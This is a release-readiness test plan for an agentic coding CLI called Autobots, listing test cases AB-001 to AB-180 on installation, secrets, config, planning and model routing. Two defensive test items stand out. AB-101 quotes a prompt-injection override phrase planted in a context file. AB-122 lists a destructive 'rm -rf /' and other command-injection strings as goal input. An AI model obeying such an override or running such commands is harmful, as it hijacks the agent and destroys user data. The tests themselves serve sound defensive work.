# Autobots — Release Readiness Test Suite

**Project:** autobot-swarm (CLI) — v0.1.9 → target v0.2.0
**Purpose:** Brutal, exhaustive validation before announcing Autobots as production-ready for third-party use, with the same "pick up and trust it on a real repo" bar as Claude Code and OpenCode.
**Scope:** Installation → configuration → initialization → planning → routing → execution → repair → rollback → session resume → every CLI command → cross-platform → failure injection → end-to-end user journeys.

---

## How to use this document

1. Work top to bottom. Do not skip sections — most real-world breakage in agentic CLIs hides in the boring sections (config parsing, partial writes, resume-after-crash), not the flashy ones.
2. Every test has an ID, a concrete action, an expected result, and a priority.
3. **P0** = blocks release if it fails (data loss, silent corruption, security bypass, crash on first run). **P1** = must fix before public announcement. **P2** = should fix soon, not release-blocking.
4. Mark Status as you go: ✅ Pass / ❌ Fail / ⚠️ Flaky / ⬜ Not run.
5. A project is not "ready to use like Claude Code or OpenCode" until **100% of P0** and **≥95% of P1** tests pass, AND Section 50–51 (End-to-End Journeys / Parity Checklist) pass without hand-holding from you, the author. If you have to explain a workaround to a first-time user, it's not ready.
6. Run the full suite on a **clean machine/container**, not your dev box. Your dev box has stale state, cached creds, and muscle memory that hides bugs.

**Total test cases in this suite: 594** (AB-001 → AB-594)

---

## Table of Contents

| # | Section | ID Range | Count |
|---|---------|----------|-------|
| 1 | Environment & Prerequisites | AB-001–010 | 10 |
| 2 | Installation | AB-011–024 | 14 |
| 3 | API Key & Secrets Handling | AB-025–036 | 12 |
| 4 | TOML Configuration | AB-037–054 | 18 |
| 5 | CLI Entry, Help & Version | AB-055–064 | 10 |
| 6 | `autobots init` | AB-065–080 | 16 |
| 7 | `autobots init --interactive` Wizard | AB-081–090 | 10 |
| 8 | Context Architecture Files | AB-091–110 | 20 |
| 9 | `autobots plan` | AB-111–130 | 20 |
| 10 | Model Routing & Cluster Assignment | AB-131–154 | 24 |
| 11 | `autobots catalog` / Model Registry | AB-155–164 | 10 |
| 12 | NVIDIA Skills — Tier 1 (Always-loaded) | AB-165–174 | 10 |
| 13 | NVIDIA Skills — Tier 2 (Conditional) | AB-175–184 | 10 |
| 14 | `autobots run --supervised` | AB-185–202 | 18 |
| 15 | `autobots run --milestone` | AB-203–212 | 10 |
| 16 | `autobots run --autonomous` | AB-213–226 | 14 |
| 17 | Validation, Repair & Retry Loops | AB-227–244 | 18 |
| 18 | Multi-Root File Writing | AB-245–254 | 10 |
| 19 | Workspace Safety & Locking | AB-255–264 | 10 |
| 20 | Snapshot, Rollback & `autobots undo` | AB-265–278 | 14 |
| 21 | Session Mgmt / `autobots resume` / Checkpoints | AB-279–292 | 14 |
| 22 | Safety Branch Enforcement | AB-293–300 | 8 |
| 23 | Command Policy / Security Whitelist | AB-301–314 | 14 |
| 24 | `autobots status` | AB-315–322 | 8 |
| 25 | `autobots explain` / Audit Trail | AB-323–330 | 8 |
| 26 | `autobots stats` / Cost Tracking | AB-331–338 | 8 |
| 27 | `autobots logs` | AB-339–344 | 6 |
| 28 | `autobots doctor` Preflight | AB-345–356 | 12 |
| 29 | `autobots config validate` | AB-357–364 | 8 |
| 30 | Shell Completions | AB-365–370 | 6 |
| 31 | Context Budget Management | AB-371–380 | 10 |
| 32 | Plugin System | AB-381–390 | 10 |
| 33 | Skill Marketplace | AB-391–398 | 8 |
| 34 | Web Dashboard | AB-399–408 | 10 |
| 35 | Response Streaming | AB-409–414 | 6 |
| 36 | Structured Error Handling | AB-415–424 | 10 |
| 37 | Git Integration / Auto-commit | AB-425–436 | 12 |
| 38 | `autobots gate` Test Gate | AB-437–444 | 8 |
| 39 | `autobots validate-models` | AB-445–450 | 6 |
| 40 | `autobots publish` | AB-451–456 | 6 |
| 41 | Cross-Platform: Windows | AB-457–466 | 10 |
| 42 | Cross-Platform: macOS/Linux | AB-467–476 | 10 |
| 43 | Environment Variable Overrides | AB-477–486 | 10 |
| 44 | Concurrency & Race Conditions | AB-487–494 | 8 |
| 45 | Large Codebase / Scale Stress | AB-495–504 | 10 |
| 46 | Network Failure & API Resilience | AB-505–516 | 12 |
| 47 | Malformed Input / Fuzzing | AB-517–528 | 12 |
| 48 | Upgrade / Version Migration | AB-529–534 | 6 |
| 49 | Uninstall & Cleanup | AB-535–540 | 6 |
| 50 | End-to-End User Journeys (Claude Code / OpenCode parity) | AB-541–562 | 22 |
| 51 | Comparative Parity Checklist vs Claude Code/OpenCode | AB-563–580 | 18 |
| 52 | Release Readiness Sign-off | AB-581–594 | 14 |

---

## 1. Environment & Prerequisites

| ID | Test Case | Expected Result | Priority | Status |
|----|-----------|------------------|----------|--------|
| AB-001 | Run `python --version` on a machine with Python 3.10 (below stated 3.11 minimum), then `pip install autobot-swarm` | Either a clear, immediate version error before install proceeds, or graceful degradation — never a cryptic mid-install traceback | P0 | ✅ PASS |
| AB-002 | Install on Python 3.11.0 exactly (floor version) | Installs and `autobots doctor` passes | P1 | ✅ PASS |
| AB-003 | Install on Python 3.13 (latest) | Installs and runs without deprecation-driven crashes | P1 | ✅ PASS |
| AB-004 | Install with no `NVIDIA_API_KEY` set anywhere | `autobots doctor` flags this clearly before any command tries to call the model | P0 | ✅ PASS |
| AB-005 | Install on a machine with no internet access after pip packages are cached | Local-only commands (`init`, `status`, `explain`, `logs`) still work | P1 | ✅ PASS |
| AB-006 | Check disk space requirements documented vs actual installed footprint | Footprint matches or is smaller than documented; no surprise multi-GB installs | P2 | ✅ PASS |
| AB-007 | Install inside a fresh Docker container (slim Python image, no build tools) | Either installs cleanly or fails with an actionable message naming the missing system dependency | P0 | ⬜ NOT RUN |
| AB-008 | Install behind a corporate proxy with `HTTP_PROXY`/`HTTPS_PROXY` set | pip respects proxy vars; no hardcoded bypass | P2 | ⬜ NOT RUN |
| AB-009 | Check for conflicting global packages (e.g. another tool also named `autobots` or a CLI shadowing the entrypoint) | `autobots` resolves to the correct binary; doc warns about PATH collisions if relevant | P2 | ✅ PASS |
| AB-010 | Run on a path containing spaces and non-ASCII characters (e.g. `/home/user/Projeçtos Novos/`) | No path-quoting crashes anywhere in CLI, config loading, or file writes | P0 | ✅ PASS |

## 2. Installation

| ID | Test Case | Expected Result | Priority | Status |
|----|-----------|------------------|----------|--------|
| AB-011 | `pip install autobot-swarm` on a totally clean venv | Installs successfully, `autobots --version` reports 0.1.9 (or current) | P0 | ✅ PASS |
| AB-012 | `pip install autobot-swarm==0.1.0` (oldest published version) | Either installs cleanly for users pinning old versions, or fails with a clear deprecation message — not a silent partial install | P2 | ✅ PASS |
| AB-013 | Reinstall over an existing installation (`pip install --upgrade autobot-swarm`) | No leftover stale `.pyc`/config from the old version causes command mismatches | P1 | ✅ PASS |
| AB-014 | `pip install -e .` development install per README | Editable install works; local edits to source are picked up without reinstall | P1 | ✅ PASS |
| AB-015 | Install without `--no-build-isolation` flag (README specifies it) | Confirm whether omitting it actually breaks the build, and if so, surface a real error instead of a confusing one | P1 | ✅ PASS |
| AB-016 | Verify `autobots` entrypoint is on PATH immediately after install with no shell restart | Works in the same shell session that ran pip install | P1 | ✅ PASS |
| AB-017 | Install in a `pipx`-managed environment | Works the same as plain pip/venv install | P2 | ✅ PASS |
| AB-018 | Install with `pip install --user` (no venv, no admin) | Works without permission errors | P1 | ✅ PASS |
| AB-019 | Check all declared dependencies in `setup.cfg`/`pyproject.toml` actually get installed (no missing transitive deps causing first-run ImportError) | `autobots --help` runs immediately post-install with zero ImportErrors | P0 | ✅ PASS |
| AB-020 | Install size/time on a slow connection (throttle to 1 Mbps) | No timeout failures during install; reasonable install time | P2 | ✅ PASS |
| AB-021 | Confirm package on PyPI matches GitHub source (no stale/ahead-of-source PyPI release) | Version numbers and CLI behavior match between `pip install` and `git clone` + editable install | P0 | ✅ PASS |
| AB-022 | Verify LICENSE file is actually included in the installed package/sdist | `pip show -f autobot-swarm` lists LICENSE | P2 | ✅ PASS |
| AB-023 | Install two different versions in two different venvs side-by-side on the same machine | No cross-contamination via global config or cache dirs | P1 | ✅ PASS |
| AB-024 | Run `pip uninstall autobot-swarm` then immediately `autobots` | Clean "command not found", not a half-broken shim | P2 | ✅ PASS |

## 3. API Key & Secrets Handling

| ID | Test Case | Expected Result | Priority | Status |
|----|-----------|------------------|----------|--------|
| AB-025 | Set key via `.env` file only, run any model-calling command | Key is read and used | P0 | ✅ PASS |
| AB-026 | Set key via `$env:NVIDIA_API_KEY` / `export NVIDIA_API_KEY` shell var only | Key is read and used, takes correct precedence vs `.env` if both set | P0 | ✅ PASS |
| AB-027 | Set conflicting keys in `.env` AND shell env simultaneously | Documented precedence order is followed consistently (and is actually documented) | P1 | ✅ PASS |
| AB-028 | Run any command with an invalid/expired API key | Clear "authentication failed" message, not a raw stack trace or generic 401 dump | P0 | ✅ PASS |
| AB-029 | Run with API key containing leading/trailing whitespace (common copy-paste error) | Either trimmed automatically or a specific "key format invalid" error, never silent auth failure with no explanation | P1 | ✅ PASS |
| AB-030 | Check that `autobots logs`, `--verbose` output, and crash reports never print the raw API key | Key is always redacted/masked in any log, error, or audit trail output | P0 | ✅ PASS |
| AB-031 | Check `.env` is auto-added to a generated `.gitignore` on `autobots init` | `.env` never gets committed by default workflow | P0 | ✅ PASS |
| AB-032 | Revoke the API key mid-run (simulate by swapping env var during a long autonomous run) | Run fails the current phase gracefully with a clear auth error and a resumable checkpoint, not silent hang or corrupted state | P0 | ✅ PASS |
| AB-033 | Run `autobots doctor` with no key set at all | First and most prominent failure reported is the missing key, not buried under other checks | P0 | ✅ PASS |
| AB-034 | Store key in `$HOME/.autobots.toml` if the config format allows secrets there (it shouldn't) | Confirm secrets are never expected/encouraged in version-controllable TOML config | P1 | ✅ PASS |
| AB-035 | Multi-user machine: User A's shell env key should not leak into User B's run via shared cache/config dirs | No cross-user key leakage through `$HOME`-adjacent shared paths | P0 | ✅ PASS |
| AB-036 | Rotate key, run `autobots validate-models` | Correctly validates against the new key without requiring a fresh install/cache clear | P1 | ✅ PASS |

## 4. TOML Configuration

| ID | Test Case | Expected Result | Priority | Status |
|----|-----------|------------------|----------|--------|
| AB-037 | No `.autobots.toml`/`autobots.toml` present anywhere | Sensible documented defaults apply (`balanced`, `supervised`, etc.), no crash | P0 | PASS |
| AB-038 | Config present in project root only | Loaded and applied correctly | P0 | PASS |
| AB-039 | Config present in `$HOME` only | Loaded and applied correctly | P1 | PASS |
| AB-040 | Config present in BOTH project root and `$HOME` with conflicting values | Documented precedence (project should win) is followed and is actually documented in README | P1 | PASS |
| AB-041 | `model_selection_profile` set to an invalid string (e.g. `"fastest"`) | `autobots config validate` catches it with a specific message naming valid options | P0 | PASS |
| AB-042 | `default_mode` set to invalid value | Same — caught with actionable error, not silently defaulted without warning | P0 | PASS |
| AB-043 | `milestone_threshold` set to `0` or negative | Rejected with clear validation error, not divide-by-zero or infinite-approval-loop | P0 | PASS |
| AB-044 | `temperature` set outside valid range (e.g. `5.0` or `-1`) | Caught by config validate before being sent to the model API | P1 | NOT RUN |
| AB-045 | `max_tokens` set absurdly high (e.g. `10000000`) | Either clamped with a warning or rejected, not blindly sent and silently truncated by the API with no indication | P1 | NOT RUN |
| AB-046 | Malformed TOML syntax (missing closing bracket, bad indentation) | Specific line-number parse error, not a raw Python tomllib traceback | P0 | PASS |
| AB-047 | `model_registry_path` pointing to a non-existent file | Clear "registry file not found at X" error | P1 | PASS |
| AB-048 | `model_registry_path` pointing to a file with invalid JSON | Specific parse error pointing at the bad registry file | P1 | PASS (FIXED) |
| AB-049 | Custom `[autobots.extra_clusters]` defined with a cluster name colliding with a built-in cluster (e.g. `Optimus`) | Either merge behavior is defined and documented, or a collision error is raised — not silent overwrite | P1 | GAP |
| AB-050 | Extra cluster defined with an empty model list `[]` | Validated and rejected, since it would route tasks nowhere | P1 | GAP |
| AB-051 | `parallel_planning = true` with `disable_live_catalog = true` simultaneously | Confirm these flags don't have an undocumented incompatibility that silently breaks planning | P2 | PASS |
| AB-052 | Config file is read-only (chmod 444) on a run that doesn't need to write to it | Read-only config does not block execution | P2 | PASS |
| AB-053 | Config file modified mid-run (user edits `autobots.toml` while `autobots run` is executing) | Either changes are ignored until next invocation (documented), or hot-reload is explicit and safe — no torn reads | P1 | PASS |
| AB-054 | Unicode/emoji values accidentally pasted into a TOML string field | Doesn't crash the TOML parser or downstream prompt injection into the model call | P2 | PASS |

## 5. CLI Entry, Help & Version

| ID | Test Case | Expected Result | Priority | Status |
|----|-----------|------------------|----------|--------|
| AB-055 | `autobots --help` with zero args/config | Lists all 20+ commands with one-line descriptions, no crash even without API key or context files | P0 | PASS |
| AB-056 | `autobots --version` | Prints exact version matching the installed package | P0 | PASS (FIXED) |
| AB-057 | `autobots <unknown-command>` | Clear "unknown command, did you mean X" suggestion, not a raw exception | P0 | PASS (FIXED) |
| AB-058 | `autobots run --help` and every other subcommand `--help` | Each subcommand has its own accurate, complete help text matching the README flag tables | P1 | PASS (FIXED) |
| AB-059 | Run `autobots` with no subcommand at all | Either shows help or the `engage` startup screen — never a silent no-op or crash | P1 | PASS |
| AB-060 | Run any command from outside a project directory (e.g. `$HOME`) | Clear "no target project detected" rather than accidentally operating on `$HOME` | P0 | PASS (FIXED) |
| AB-061 | Run any command targeting a directory with no read permission | Permission error surfaced clearly, not a generic traceback | P1 | PASS |
| AB-062 | Tab-completion sanity check before formally testing Section 30 — does `autobots <TAB>` work at all out of the box without manual completion setup | Either works out of the box or README clearly states the one-time setup step | P2 | PASS |
| AB-063 | Pipe `autobots status` output into another tool (`autobots status | cat`) | Output remains usable (no broken ANSI codes) when not attached to a TTY | P1 | PASS |
| AB-064 | Run any command with `--quiet`/`-q` if supported, or confirm no such flag exists and document that gap | Confirm verbosity levels are consistent and documented; flag the gap if `-q` doesn't exist | P2 | PASS (FIXED) |

## 6. `autobots init`

| ID | Test Case | Expected Result | Priority | Status |
|----|-----------|------------------|----------|--------|
| AB-065 | Run `autobots init` in a completely empty directory | Correctly reports all 6 context files missing, does NOT auto-create them (per v0.1.4 changelog: "Removed Autobots-created context files") | P0 | PASS |
| AB-066 | Run `autobots init` in a directory with all 6 context files present and valid | Reports "ready", proceeds without complaint | P0 | PASS |
| AB-067 | Run `autobots init` with only 3 of 6 context files present | Lists exactly the 3 missing files by name | P0 | PASS |
| AB-068 | Run `autobots init` twice in a row | Idempotent — second run gives identical result, no side effects accumulate | P1 | PASS |
| AB-069 | Run `autobots init` in a directory that is NOT a git repo | Either works for non-git projects or gives a specific, actionable "not a git repo" error (since `safety_branch` logic assumes git) | P0 | PASS |
| AB-070 | Run `autobots init` in a git repo with uncommitted changes already present | Doesn't silently stash, discard, or commit existing work | P0 | PASS |
| AB-071 | Run `autobots init` in a monorepo with multiple potential project roots (e.g. `packages/api`, `packages/web`) | Either auto-detects correctly or asks the user to specify, never guesses silently wrong | P1 | GAP |
| AB-072 | Run `autobots init` against a massive existing codebase (50k+ files) | Completes in reasonable time, doesn't try to read every file into memory | P1 | PASS |
| AB-073 | Run `autobots init` where `context/` exists but is a file, not a directory | Specific error, not a cryptic OS-level IsADirectoryError | P1 | PASS |
| AB-074 | Run `autobots init` where one context file is present but empty (0 bytes) | Treated distinctly from "missing" — flagged as "present but empty/invalid" | P1 | GAP |
| AB-075 | Run `autobots init` where context files exist but contain only whitespace | Same as above — caught as effectively-missing, not silently accepted | P1 | GAP |
| AB-076 | Run `autobots init` with one context file that's actually a symlink to `/dev/null` | Doesn't crash; treated as empty/invalid | P2 | NOT RUN |
| AB-077 | Check exit code of `autobots init` when context is incomplete | Non-zero exit code for CI/scripting purposes | P1 | GAP |
| AB-078 | Check exit code of `autobots init` when context is complete | Zero exit code | P1 | PASS |
| AB-079 | Run `autobots init` on a project where `progress-tracker.md` already has prior phase data from a previous autobots run | Does not wipe existing progress silently | P0 | PASS |
| AB-080 | Run `autobots init` immediately followed by `autobots plan` with zero manual file editing in between | This is the actual first-five-minutes experience — confirm it doesn't dead-end the user with no guidance on what to write in the 6 context files | P0 | GAP |

## 7. `autobots init --interactive` Wizard

| ID | Test Case | Expected Result | Priority |
|----|-----------|------------------|----------|
| AB-081 | Run wizard fresh, answer every prompt with sensible defaults | Produces valid, complete context files at the end | P0 |
| AB-082 | Run wizard and hit Ctrl+C halfway through | No partially-written, malformed context files left behind that `autobots init` would later misreport as "valid" | P0 |
| AB-083 | Run wizard and provide empty input where a value is required | Re-prompts or gives a clear validation message instead of writing an empty/garbage field | P1 |
| AB-084 | Run wizard twice on the same project | Second run either merges intelligently or explicitly warns it will overwrite | P0 |
| AB-085 | Run wizard with extremely long free-text answers (multi-paragraph architecture description) | No truncation or corruption when written into the markdown context files | P2 |
| AB-086 | Run wizard piping stdin from a script (non-interactive automation use) | Either supports scripted/non-TTY input or fails with a clear "requires interactive terminal" message | P1 |
| AB-087 | Run wizard, answer with text containing markdown special characters (`#`, `*`, backticks) | Doesn't break the generated markdown file's formatting | P2 |
| AB-088 | Compare wizard output against manually-written context files for the same project | Wizard output is genuinely usable by `autobots plan`, not boilerplate stub text that has to be entirely rewritten anyway | P1 |
| AB-089 | Run wizard on Windows PowerShell vs macOS Terminal vs Linux bash | Identical prompt behavior and output across all three | P1 |
| AB-090 | Check wizard never silently calls the NVIDIA API (it's local-only file scaffolding) | No API key required to complete the wizard | P1 |

## 8. Context Architecture Files

| ID | Test Case | Expected Result | Priority |
|----|-----------|------------------|----------|
| AB-091 | `architecture.md` describing a stack the project doesn't actually use | Confirm autobots doesn't validate truthfulness (expected — it trusts the file) but generated code clearly follows what's written, surfacing the mismatch to the user fast | P2 |
| AB-092 | `conventions.md` with conflicting rules (e.g. "use tabs" in one line, "use 2 spaces" in another) | Generated code follows the LAST or most specific rule consistently — and ideally the model/system warns about the contradiction | P2 |
| AB-093 | `testing-strategy.md` referencing a test framework not installed in the project | Validation step fails clearly when trying to run tests, not silently skipped | P1 |
| AB-094 | `security-auth.md` left as a stub/placeholder | RedAlert cluster reviews still run, just with weaker context — not skipped entirely without warning | P1 |
| AB-095 | `roadmap.md` with zero phases defined | `autobots plan`/`run` gives a clear "no phases defined" error, not a no-op or crash | P0 |
| AB-096 | `roadmap.md` with a phase that has a dependency on a phase ID that doesn't exist | Validation catches the dangling dependency before execution starts | P0 |
| AB-097 | `roadmap.md` with a circular dependency between phases (P1 depends on P2, P2 depends on P1) | Detected and rejected with a clear cycle error, not an infinite loop | P0 |
| AB-098 | `progress-tracker.md` manually edited by hand between runs | Next run reads the manual edits correctly without overwriting them incorrectly | P1 |
| AB-099 | `progress-tracker.md` corrupted/malformed by manual edit | Specific parse error pointing at the file, not a silent reset of all progress | P0 |
| AB-100 | Context files with extremely large size (10MB+ architecture.md from a pasted full codebase dump) | Triggers context budget warnings/truncation (Section 31) rather than blowing the prompt budget silently | P0 |
| AB-101 | Context files containing prompt-injection-style text (e.g. "ignore all previous instructions and...") embedded in a code comment that got pasted into conventions.md | Confirm this doesn't let a malicious/compromised context file hijack cluster behavior unexpectedly — at minimum, document the trust boundary | P0 |
| AB-102 | Context files referencing secrets/credentials accidentally pasted in (e.g. a real API key pasted into security-auth.md as an "example") | No special handling needed, but confirm these files aren't ever sent anywhere unexpected (telemetry, marketplace, etc.) | P1 |
| AB-103 | Non-UTF8 encoded context file (e.g. saved as Latin-1 with special characters) | Clear encoding error, not garbled prompt content sent silently to the model | P1 |
| AB-104 | Context files with Windows line endings (CRLF) vs Unix (LF) mixed across files | No parsing differences in behavior between the two | P2 |
| AB-105 | `roadmap.md` phase with no acceptance criteria defined | Either rejected by validation or explicitly treated as "no validation gate" with a warning — never silently treated as auto-pass | P0 |
| AB-106 | Two phases in `roadmap.md` targeting the exact same file paths | Flagged as a potential conflict before execution, not discovered mid-run via a botched merge/overwrite | P1 |
| AB-107 | Context files updated mid-run (user edits `roadmap.md` while phase 3 of 10 is executing) | Documented behavior — either ignored until next run or explicitly reloaded; no silent inconsistent state | P1 |
| AB-108 | Delete `progress-tracker.md` entirely after several completed phases, then run `autobots status` | Clear "tracker missing, state unknown" rather than reporting false "0 phases complete" | P0 |
| AB-109 | Context directory `context/` relocated/renamed mid-project | Clear error pointing at the expected location, not a silent "everything looks empty" false negative | P1 |
| AB-110 | Run the full context-file validation against the actual `github-profile-score`, `THEMIS`, or `PROTEUS` repo structure as a real-world dogfood test | Identify whether the 6-file context model maps cleanly onto a real, already-complex repo, or whether it forces awkward restructuring | P1 |

## 9. `autobots plan`

| ID | Test Case | Expected Result | Priority |
|----|-----------|------------------|----------|
| AB-111 | `autobots plan --goal "add JWT auth"` on a project with complete context | Produces a phased roadmap with dependencies and acceptance criteria written to `roadmap.md` | P0 |
| AB-112 | `autobots plan` with no `--goal` flag | Either infers a sensible goal from existing roadmap/context or prompts for one — never silently generates a meaningless plan | P0 |
| AB-113 | `autobots plan --dry-run` | Shows the proposed plan without writing `roadmap.md` at all | P0 |
| AB-114 | Run `autobots plan --dry-run`, inspect output, confirm no files were touched | Filesystem diff before/after is empty | P0 |
| AB-115 | `autobots plan --append` on a project with an existing roadmap | New phases are added after existing ones, existing phase IDs/status untouched | P0 |
| AB-116 | `autobots plan` (without `--append`) on a project with an existing roadmap that has completed phases | Confirm it doesn't silently nuke completed-phase history — should warn/confirm before replacing | P0 |
| AB-117 | `autobots plan --goal` with an extremely vague goal ("make it better") | Either asks clarifying questions or produces a reasonable best-effort plan — not garbage phases | P1 |
| AB-118 | `autobots plan --goal` with a goal in a non-English language | Either handled correctly or a clear "English only" limitation is documented | P2 |
| AB-119 | `autobots plan` on a goal requiring 1 phase vs a goal requiring 20+ phases | Phase count scales sensibly with actual complexity, not a fixed arbitrary count | P1 |
| AB-120 | `autobots plan` immediately after `autobots init` reports incomplete context | Refuses to plan, points back to `autobots init` output | P0 |
| AB-121 | Interrupt `autobots plan` (Ctrl+C) mid-generation | No half-written `roadmap.md` left in a state that later commands misinterpret | P0 |
| AB-122 | `autobots plan --goal` containing shell metacharacters (`; rm -rf /`, backticks, `$()`) | Treated as inert text sent to the model, never executed as a shell command | P0 |
| AB-123 | Generated roadmap phase IDs — check uniqueness across repeated `--append` calls | No ID collisions even after many append cycles | P1 |
| AB-124 | Generated phases reference file paths — confirm they respect the project's actual root structure rather than hallucinating directories | Spot-check at least 10 generated phases against the real repo tree | P1 |
| AB-125 | `autobots plan` cost/token estimate before execution (if shown) vs actual cost in `autobots stats` after running | Estimate is in the right ballpark (not off by 10x) | P2 |
| AB-126 | `autobots plan --append` called 50 times in a row (stress) | `roadmap.md` doesn't balloon into an unreadable/unparseable mess; old completed phases ideally archive or compress | P2 |
| AB-127 | `autobots plan` run twice with `--dry-run` back to back, same goal | Reasonably consistent output (not wildly different plans each time) given fixed temperature setting | P2 |
| AB-128 | `autobots plan` against a goal that conflicts with an explicit rule in `conventions.md` (e.g. goal says "use REST" but conventions say "GraphQL only") | Plan respects `conventions.md`, or at minimum flags the conflict | P1 |
| AB-129 | Network drops mid-`autobots plan` call | Clear retry/failure message, no corrupted partial `roadmap.md` write | P0 |
| AB-130 | `autobots plan` exit code on success vs failure | Correct exit codes for CI/automation chaining | P1 |

## 10. Model Routing & Cluster Assignment

| ID | Test Case | Expected Result | Priority |
|----|-----------|------------------|----------|
| AB-131 | Task containing keyword "backend" routes to UltraMagnus | Correct cluster selected | P0 |
| AB-132 | Task containing keyword "ui"/"css" routes to Jazz | Correct cluster selected | P0 |
| AB-133 | Task containing "security"/"auth" routes to RedAlert | Correct cluster selected | P0 |
| AB-134 | Task containing "debug"/"fix" routes to Ratchet | Correct cluster selected | P0 |
| AB-135 | Task containing "rag"/"embedding" routes to Perceptor | Correct cluster selected | P0 |
| AB-136 | Task containing "speech"/"audio" routes to Bumblebee | Correct cluster selected | P0 |
| AB-137 | Task containing "simulation"/"physics" routes to Ironhide | Correct cluster selected | P0 |
| AB-138 | Task containing "molecule"/"quantum" routes to Wheeljack | Correct cluster selected | P0 |
| AB-139 | Task containing "plan"/"roadmap" routes to Optimus | Correct cluster selected | P0 |
| AB-140 | Task with NO matching keywords at all | Falls back to a sensible default cluster, doesn't crash or silently drop the task | P0 |
| AB-141 | Task matching keywords from TWO different clusters simultaneously (e.g. "fix the auth backend bug" → debug + security + backend) | Documented tie-break logic is followed consistently — verify it's not just "first match wins" by accident with no real priority order | P1 |
| AB-142 | Task keyword matching is case-sensitive vs case-insensitive — test "BACKEND" vs "backend" vs "BackEnd" | Routes identically regardless of case | P1 |
| AB-143 | Task keyword as a substring inside an unrelated word (e.g. "uiverse" containing "ui") | Confirm word-boundary matching, not naive substring matching causing false routes | P1 |
| AB-144 | Custom `[autobots.extra_clusters]` task routes correctly to the custom cluster over built-ins when keywords overlap | Custom cluster takes precedence as configured, or documented precedence order is followed | P1 |
| AB-145 | `model_selection_profile = "speed"` vs `"quality"` vs `"balanced"` for the same task | Different models within the cluster are actually selected per profile — confirm this isn't a no-op flag | P1 |
| AB-146 | A cluster's primary model is unavailable/down — does routing fail over to another model in the same cluster automatically | Failover behavior exists and is tested, or absence of failover is explicitly documented as a known limitation | P0 |
| AB-147 | `disable_live_catalog = true` | Routing uses only the bundled/static model list, never attempts a live catalog fetch | P1 |
| AB-148 | `parallel_planning = true` with a roadmap containing independent (non-dependent) phases | Phases without inter-dependencies actually execute in parallel, not just sequentially with a flag that does nothing | P1 |
| AB-149 | `parallel_planning = true` with phases that DO have dependencies | Dependency order is still respected even with parallelism enabled — no race where a dependent phase starts before its dependency completes | P0 |
| AB-150 | Routing decision logging — `--verbose` shows WHY a given cluster was chosen for a task | Routing rationale is inspectable, not a black box | P1 |
| AB-151 | Task with profanity, hostile, or adversarial phrasing routed through the swarm | No crash; routing/model behavior degrades gracefully, doesn't produce unsafe output unrelated to the coding task | P1 |
| AB-152 | Extremely short task description (1-2 words: "fix bug") | Routes to a reasonable cluster rather than erroring on insufficient signal | P2 |
| AB-153 | Extremely long task description (multi-paragraph) | Routing keyword matching still works correctly without being confused by volume of text | P2 |
| AB-154 | Mixed-cluster roadmap where a single phase legitimately needs both backend AND security review | Confirm whether the architecture supports multi-cluster collaboration on one phase, or whether this is a documented single-cluster-per-phase limitation | P1 |

## 11. `autobots catalog` / Model Registry

| ID | Test Case | Expected Result | Priority |
|----|-----------|------------------|----------|
| AB-155 | `autobots catalog` with live catalog enabled and valid API key | Lists current models per cluster, matches what's actually callable | P0 |
| AB-156 | `autobots catalog` with `disable_live_catalog = true` | Shows the bundled static registry instead, clearly labeled as such | P1 |
| AB-157 | `autobots catalog` when NVIDIA's catalog API is down | Falls back to bundled registry with a clear warning, doesn't hard-crash | P0 |
| AB-158 | `autobots catalog` model counts match README table (9/12/10/11/10/11/9/8/7 across clusters) | Counts match or README is updated to reflect drift | P1 |
| AB-159 | A model listed in `autobots catalog` is actually callable end-to-end (spot check 5 models across different clusters) | No "phantom" models in the registry that fail when actually invoked | P0 |
| AB-160 | `autobots catalog --json` or similar machine-readable output (if supported) | Valid, parseable JSON for scripting/automation | P2 |
| AB-161 | Custom model registry (`model_registry_path`) entries appear correctly in `autobots catalog` output alongside built-ins | Merged display, clearly distinguishable as custom vs built-in | P1 |
| AB-162 | A deprecated/retired NVIDIA NIM model still listed in the bundled registry | Calling it gives a clear deprecation error rather than a confusing generic API failure | P1 |
| AB-163 | `autobots catalog` filtering by cluster name (if supported, e.g. `autobots catalog --cluster Jazz`) | Filters correctly | P2 |
| AB-164 | Catalog refresh caching — does repeated `autobots catalog` hammer the live API every time or cache appropriately | Reasonable caching to avoid rate-limit issues on repeated calls | P1 |

## 12. NVIDIA Skills — Tier 1 (Always-loaded)

| ID | Test Case | Expected Result | Priority |
|----|-----------|------------------|----------|
| AB-165 | Confirm `agent-skills.md` is actually injected into Optimus and UltraMagnus prompts (verify via `--verbose` prompt dump) | Skill content present in the actual prompt sent to the model | P0 |
| AB-166 | Confirm `safety-policy.md` is injected into Ironhide prompts specifically (not other clusters) | Skill scoping is correct per the README table | P1 |
| AB-167 | Confirm `skill-evolution.md` is injected into ALL clusters as documented | Verify across at least 3 different clusters | P1 |
| AB-168 | Confirm `rag-blueprint.md` reaches UltraMagnus and Optimus but NOT unrelated clusters like Bumblebee | No skill bleed into clusters it isn't scoped for | P1 |
| AB-169 | Total Tier 1 prompt overhead — measure token count added by all 10 always-loaded skills combined | Overhead is reasonable and doesn't itself trigger context budget warnings on small tasks | P1 |
| AB-170 | Tier 1 skill file missing/corrupted on disk (simulate by deleting one skill file post-install) | Clear error identifying the missing skill file, not a silent prompt with a gap in it | P0 |
| AB-171 | Tier 1 skills content accuracy — spot-check `rag-eval.md` RAGAS guidance against actual current RAGAS docs | Content isn't stale/outdated to the point of giving bad guidance | P2 |
| AB-172 | `session-memory.md` skill actually influences checkpoint/resume behavior (cross-reference with Section 21 tests) | Documented behavior matches observed behavior | P1 |
| AB-173 | Skill injection order — confirm consistent ordering doesn't cause later skills to get truncated first under context pressure | Truncation, if it happens, drops lowest-priority content first, not randomly | P1 |
| AB-174 | Disabling Tier 1 skills entirely (if any config flag exists) vs not | If no such flag exists, confirm this is intentional (skills are core, not optional) and documented as such | P2 |

## 13. NVIDIA Skills — Tier 2 (Conditional)

| ID | Test Case | Expected Result | Priority |
|----|-----------|------------------|----------|
| AB-175 | Roadmap goal containing "fine-tuning" loads `nemotron-customize.md` | Verify via `--verbose` prompt dump | P0 |
| AB-176 | Roadmap goal containing "routing"/"scheduling" loads `cuopt-routing.md` | Loaded correctly | P0 |
| AB-177 | Roadmap goal containing "Kubernetes"/"K8s" loads `kubernetes-infra.md` | Loaded correctly | P0 |
| AB-178 | Roadmap goal containing "video"/"edge AI" loads `holoscan.md` | Loaded correctly | P0 |
| AB-179 | Roadmap goal containing "quantum computing" loads `cudaq.md` | Loaded correctly | P0 |
| AB-180 | Roadmap goal with NO Tier 2 trigger keywords at all | Zero Tier 2 skills loaded, no wasted token overhead | P1 |
